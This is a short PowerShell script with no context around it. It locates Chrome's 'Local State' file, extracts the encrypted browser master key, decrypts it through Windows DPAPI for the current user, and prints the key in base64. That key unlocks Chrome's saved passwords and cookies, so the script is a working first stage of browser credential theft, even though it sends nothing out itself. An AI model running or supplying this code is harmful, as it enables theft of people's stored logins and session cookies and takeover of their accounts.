$localStatePath = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Google\Chrome\User Data\Local State')
$localState = Get-Content -Raw $localStatePath | ConvertFrom-Json
$encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
$encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)]
Add-Type -AssemblyName System.Security
$key = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
[Convert]::ToBase64String($key)
